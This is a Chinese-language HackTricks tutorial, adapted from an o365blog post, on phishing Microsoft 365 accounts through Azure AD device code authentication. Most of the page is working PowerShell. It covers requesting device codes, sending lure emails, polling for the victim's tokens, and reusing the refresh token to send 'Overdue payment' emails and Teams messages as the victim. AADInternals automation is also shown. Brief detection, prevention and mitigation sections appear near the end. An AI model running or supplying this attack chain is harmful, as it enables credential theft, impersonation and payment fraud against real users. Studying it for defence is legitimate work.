# Az - 设备代码身份验证钓鱼

<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>!</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

**本文摘自** [**https://o365blog.com/post/phishing/**](https://o365blog.com/post/phishing/)****

### 什么是设备代码身份验证 <a href="#what-is-device-code-authentication" id="what-is-device-code-authentication"></a>

根据微软[文档](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code)，设备代码身份验证：

> 允许用户登录到输入受限的设备，如智能电视、物联网设备或打印机。为了启用这种流程，设备让用户在另一台设备的浏览器中访问网页进行登录。一旦用户登录，设备就能根据需要获取访问令牌和刷新令牌。

过程如下：

1. 用户在设备上启动支持设备代码流的应用
2. 应用连接到Azure AD /devicecode端点并发送 **client\_id** 和 **resource**
3. Azure AD 发回 **device\_code**、**user\_code** 和 **verification\_url**
4. 设备显示 **verification\_url** (hxxps://microsoft.com/devicelogin) 和用户提供的 **user\_code**
5. 用户打开浏览器，导航到 **verification\_url**，在被询问时提供 **user\_code** 并登录
6. 设备轮询Azure AD，成功登录后获取 **access\_token** 和 **refresh\_token**

![设备代码流程](https://o365blog.com/images/posts/phishing\_5.png)

### 使用设备代码身份验证进行钓鱼 <a href="#phishing-with-device-code-authentication" id="phishing-with-device-code-authentication"></a>

利用设备代码身份验证进行钓鱼的基本思路如下。

1. 攻击者连接到/devicecode端点并发送 **client\_id** 和 **resource**
2. 收到 **verification\_uri** 和 **user\_code** 后，创建一封包含指向 **verification\_uri** 和 **user\_code** 的链接的电子邮件，并发送给受害者。
3. 受害者点击链接，提供代码并完成登录。
4. 攻击者接收 **access\_token** 和 **refresh\_token**，现在可以模仿受害者。

#### 1. 连接到/devicecode端点 <a href="#1-connecting-to-devicecode-endpoint" id="1-connecting-to-devicecode-endpoint"></a>

第一步是对Azure AD devicecode端点进行http POST：
```
https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0
```
我使用了以下参数。我选择使用“Microsoft Office” client\_id，因为它看起来是最合法的应用程序名称，并且它也可以用来访问其他资源。所选资源允许访问AAD Graph API，该API被MSOnline PowerShell模块使用。

| 参数        | 值                                                      |
| ---------- | ------------------------------------------------------- |
| client\_id | d3590ed6-52b3-4102-aeff-aad2292ab01c                    |
| resource   | [https://graph.windows.net](https://graph.windows.net/) |

响应类似于以下内容：
```json
{
"user_code": "CLZ8HAV2L",
"device_code": "CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t_ZM2B0cgcjQgAA",
"verification_url": "https://microsoft.com/devicelogin",
"expires_in": "900",
"interval": "5",
"message": "To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code CLZ8HAV2L to authenticate."
}
```
| 参数              | 描述                                                                   |
| ----------------- | ---------------------------------------------------------------------- |
| user\_code        | 用户在被请求时需要输入的代码                                           |
| device\_code      | 用于“轮询”认证结果的设备代码                                          |
| verification\_url | 用户需要浏览以进行认证的网址                                           |
| expires\_in       | 过期时间，以秒为单位（15分钟）                                         |
| interval          | 客户端应多久轮询一次认证的时间间隔，以秒为单位                         |
| message           | 需要显示给用户的预格式化消息                                           |

以下是连接到 devicelogin 端点的脚本：
```powershell
# Create a body, we'll be using client id of "Microsoft Office"

$body=@{
"client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"resource" =  "https://graph.windows.net"
}

# Invoke the request to get device and user codes

$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body
$user_code =    $authResponse.user_code
```
**注意！** 我使用的是1.0版本，这与[文档](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code)中使用的v2.0流程略有不同。

#### 2. 创建钓鱼邮件 <a href="#2-creating-a-phishing-email" id="2-creating-a-phishing-email"></a>

现在我们有了**verification\_url**（始终相同）和**user\_code**，我们可以创建并发送钓鱼邮件。

**注意！** 发送邮件需要一个可用的smtp服务。

以下是向受害者发送钓鱼邮件的脚本：
```powershell
# Create a message

$message = @"
<html>
Hi!<br>
Here is the link to the <a href="https://microsoft.com/devicelogin">document</a>. Use the following code to access: <b>$user_code</b>. <br><br>
</html>
"@

# Send the email

Send-MailMessage -from "Don Director <dond@something.com>" -to "william.victim@target.org" -Subject "Don shared a document with you" -Body $message -SmtpServer $SMTPServer -BodyAsHtml
```
收到的电子邮件看起来像这样： ![Device Code flow](https://o365blog.com/images/posts/phishing\_6.png)

#### 3. “捕鱼” - 受害者执行认证 <a href="#3-catching-the-fish-victim-performs-the-authentication" id="3-catching-the-fish-victim-performs-the-authentication"></a>

当受害者点击链接时，会出现以下网站。我们可以看到，这个url是一个合法的Microsoft url。用户被要求输入电子邮件中的代码。

![Device code](https://o365blog.com/images/posts/phishing\_7.png)

输入代码后，用户被要求选择一个用户进行登录。我们可以看到，用户被要求登录到 **Microsoft Office** - 没有要求任何同意。

**注意！** 如果用户没有登录，用户需要使用目标组织正在使用的任何方法登录。

![Login](https://o365blog.com/images/posts/phishing\_8.png)

成功认证后，用户会看到以下内容。

![Profit](https://o365blog.com/images/posts/phishing\_9.png)

:warning: **此时用户的身份已经泄露！** :warning:

#### 4. 检索访问令牌 <a href="#4-retrieving-the-access-tokens" id="4-retrieving-the-access-tokens"></a>

对于攻击者来说，最后一步是检索访问令牌。完成第2步后，攻击者开始轮询Azure AD以获取认证状态。

攻击者需要每5秒向Azure AD令牌端点发起一个http POST请求：
```
https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0
```
请求必须包含以下参数（code 是第一步中的 device_code）

| 参数        | 值                                                                                                                                                                                                            |
| ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| client_id   | d3590ed6-52b3-4102-aeff-aad2292ab01c                                                                                                                                                                             |
| resource    | [https://graph.windows.net](https://graph.windows.net/)                                                                                                                                                          |
| code        | CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t_ZM2B0cgcjQgAA |
| grant_type  | urn:ietf:params:oauth:grant-type:device_code                                                                                                                                                                    |

如果认证处于等待状态，将返回 http 错误 **400 Bad Request**，内容如下：
```json
{
"error": "authorization_pending",
"error_description": "AADSTS70016: OAuth 2.0 device flow error. Authorization is pending. Continue polling.\r\nTrace ID: b35f261e-93cd-473b-9cf9-b81f30800600\r\nCorrelation ID: 8ee0ae8a-533f-4742-8334-e9ed939b083d\r\nTimestamp: 2020-10-14 06:06:07Z",
"error_codes": [70016],
"timestamp": "2020-10-13 18:06:07Z",
"trace_id": "b35f261e-93cd-473b-9cf9-b81f30800600",
"correlation_id": "8ee0ae8a-533f-4742-8334-e9ed939b083d",
"error_uri": "https://login.microsoftonline.com/error?code=70016"
}
```
登录成功后，我们将得到以下响应（令牌已截断）：
```json
{
"token_type": "Bearer",
"scope": "user_impersonation",
"expires_in": "7199",
"ext_expires_in": "7199",
"expires_on": "1602662787",
"not_before": "1602655287",
"resource": "https://graph.windows.net",
"access_token": "eyJ0eXAi...HQOT1rvUEOEHLeQ",
"refresh_token": "0.AAAAxkwD...WxPoK0Iq6W",
"foci": "1",
"id_token": "eyJ0eXAi...widmVyIjoiMS4wIn0."
}
```
以下脚本连接到Azure AD令牌端点并轮询认证状态。
```powershell
$continue = $true
$interval = $authResponse.interval
$expires =  $authResponse.expires_in

# Create body for authentication requests

$body=@{
"client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
"code" =       $authResponse.device_code
"resource" =   "https://graph.windows.net"
}

# Loop while authorisation is pending or until timeout exceeded

while($continue)
{
Start-Sleep -Seconds $interval
$total += $interval

if($total -gt $expires)
{
Write-Error "Timeout occurred"
return
}

# Try to get the response. Will give 40x while pending so we need to try&catch

try
{
$response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
}
catch
{
# This is normal flow, always returns 40x unless successful

$details=$_.ErrorDetails.Message | ConvertFrom-Json
$continue = $details.error -eq "authorization_pending"
Write-Host $details.error

if(!$continue)
{
# Not pending so this is a real error

Write-Error $details.error_description
return
}
}

# If we got response, all okay!

if($response)
{
break # Exit the loop

}
}
```
现在我们可以使用访问令牌来冒充受害者：
```powershell
# Dump the tenant users to csv

Get-AADIntUsers -AccessToken $response.access_token | Export-Csv users.csv
```
我们也可以使用刷新令牌获取对其他服务的访问令牌，只要 client\_id 保持不变。

以下脚本用于获取 Exchange Online 的访问令牌。
```powershell
# Create body for getting access token for Exchange Online

$body=@{
"client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"grant_type" =    "refresh_token"
"scope" =         "openid"
"resource" =      "https://outlook.office365.com"
"refresh_token" = $response.refresh_token
}

$EXOresponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token" -Body $body -ErrorAction SilentlyContinue

# Send email as the victim

Send-AADIntOutlookMessage -AccessToken $EXOresponse.access_token -Recipient "another.wictim@target.org" -Subject "Overdue payment" -Message "Pay this <h2>asap!</h2>"
```
## 使用AADInternals进行网络钓鱼 <a href="#using-aadinternals-for-phishing" id="using-aadinternals-for-phishing"></a>

AADInternals（v0.4.4或更高版本）具有一个[Invoke-AADIntPhishing](https://o365blog.com/aadinternals/#invoke-aadintphishing)功能，它可以自动化网络钓鱼过程。

钓鱼信息可以自定义，以下是默认信息：
```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/><br/>Here is a <a href="{1}">link</a> you <b>should not click</b>.<br/><br/>If you still decide to do so, provide the following code when requested: <b>{0}</b>.</div>'
```
### 电子邮件 <a href="#email" id="email"></a>

以下示例通过使用自定义消息发送钓鱼电子邮件。令牌被保存到缓存中。
```powershell
# Create a custom message

$message = '<html>Hi!<br/>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>'

# Send a phishing email to recipients using a customised message and save the tokens to cache

Invoke-AADPhishing -Recipients "wvictim@company.com","wvictim2@company.com" -Subject "Johnny shared a document with you" -Sender "Johnny Carson <jc@somewhere.com>" -SMTPServer smtp.myserver.local -Message $message -SaveToCache
```

```
Code: CKDZ2BURF
Mail sent to: wvictim@company.com
...
Received access token for william.victim@company.com
```
现在我们可以使用缓存的令牌作为受害者发送电子邮件。
```powershell
# Send email as the victim

Send-AADIntOutlookMessage -Recipient "another.wictim@target.org" -Subject "Overdue payment" -Message "Pay this <h2>asap!</h2>"
```
我们还可以发送一个Teams消息，使付款请求更加紧迫：
```powershell
# Send Teams message as the victim

Send-AADIntTeamsMessage -Recipients "another.wictim@target.org" -Message "Just sent you an email about due payment. Have a look at it."
```

```
Sent                MessageID
----                ---------
16/10/2020 14.40.23 132473328207053858
```
**以下视频展示了如何使用AADInternals进行电子邮件网络钓鱼。**

### Teams <a href="#teams" id="teams"></a>

AADInternals支持发送网络钓鱼信息作为Teams聊天消息。

**注意！** 受害者“认证”后并且令牌被接收，AADInternals将替换原始消息。这条消息可以通过-CleanMessage参数提供。

默认的清洁消息是：
```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/>If you are seeing this, <b>someone has stolen your identity!</b>.</div>'
```
```markdown
![Teams 清晰消息](https://o365blog.com/images/posts/phishing_13.png)

以下示例通过使用定制消息发送钓鱼电子邮件。令牌被保存到缓存中。
```
```powershell
# Get access token for Azure Core Management

Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Create the custom messages

$message = '<html>Hi!<br/>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>'
$cleanMessage = '<html>Hi!<br/>Have a nice weekend.</html>'

# Send a teams message to the recipient using customised messages

Invoke-AADPhishing -Recipients "wvictim@company.com" -Teams -Message $message -CleanMessage $cleanMessage -SaveToCache
```

```
Code: CKDZ2BURF
Teams message sent to: wvictim@company.com. Message id: 132473151989090816
...
Received access token for william.victim@company.com
```
**以下视频展示了如何使用AADInternals进行Teams钓鱼攻击。**

## 检测 <a href="#detecting" id="detecting"></a>

首先，从Azure AD的角度来看，登录发生在**启动**认证的地方。这是一个非常重要的点。这意味着在登录日志中，登录是从**攻击者的位置和设备**进行的，而不是用户的。

然而，使用刷新令牌获取的访问令牌**不会出现在登录日志中！**

下面是一个例子，我从Azure VM（更具体地说，是从[cloud shell](https://o365blog.com/post/cloudshell/)）发起了钓鱼攻击。我们可以看到，使用“Microsoft Office”客户端在上午7:23从IP地址51.144.240.233进行的登录。然而，在上午7:27获取Exchange Online的访问令牌并没有显示在日志中。

![Azure AD登录日志](https://o365blog.com/images/posts/phishing\_10.png)

:warning: 如果有迹象表明用户从非典型位置登录，用户账户可能已经被泄露。

## 预防 <a href="#preventing" id="preventing"></a>

预防使用这种技术的钓鱼攻击的唯一有效方法是使用[Conditional Access](https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/overview)（CA）策略。具体来说，**无法阻止钓鱼攻击**，但我们可以**阻止用户基于特定规则登录**。特别是基于位置和设备状态的策略对保护账户非常有效。这适用于目前使用的所有钓鱼技术。

然而，不可能覆盖所有情况。例如，如果用户使用MFA登录，那么强制从非法位置登录的MFA不会有帮助。

## 缓解 <a href="#mitigating" id="mitigating"></a>

如果用户已经被泄露，可以[撤销](https://docs.microsoft.com/en-us/powershell/module/azuread/revoke-azureaduserallrefreshtoken?view=azureadps-2.0)用户的刷新令牌，这可以阻止攻击者使用被泄露的刷新令牌获取新的访问令牌。

## 总结 <a href="#summary" id="summary"></a>

据我所知，设备代码认证流程技术之前没有被用于钓鱼攻击。

从攻击者的角度来看，这种方法有几个优点：

* 无需注册任何应用程序
* 无需为假登录页面等搭建钓鱼基础设施
* 用户只被要求登录（通常是到“Microsoft Office”）- 不需要同意
* 一切都发生在**login.microsoftonline.com**命名空间
* 攻击者可以使用任何client\_id和资源（尽管并非所有组合都有效）
* 如果用户使用MFA登录，访问令牌也会包含MFA声明（这也包括使用刷新令牌获取的访问令牌）
* 防止需要Conditional Access（和Azure AD Premium P1/P2许可）

从攻击者的角度来看，这种方法至少有一个缺点：

* 用户代码仅有效15分钟

当然，攻击者可以通过向多个收件人发送钓鱼电子邮件来减少时间限制 - 这将增加有人使用代码登录的可能性。

另一种方法是实现[一个代理](https://gist.github.com/Mr-Un1k0d3r/afef5a80cb72dfeaa78d14465fb0d333)，当点击链接时会开始认证（感谢[@MrUn1k0d3r](https://twitter.com/MrUn1k0d3r)）。然而，这样就失去了使用合法microsoft.com网址的优势。

抵御钓鱼活动的清单：

1. **教育你的用户**关于信息安全和钓鱼 :woman\_teacher:
2. 使用多因素认证（MFA） :iphone:
3. 使用Intune :hammer\_and\_wrench: 和Conditional Access（CA） :stop\_sign:

\

<details>

<summary><strong>从零开始学习AWS黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持HackTricks的其他方式：

* 如果你想在**HackTricks中看到你的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享你的黑客技巧。

</details>
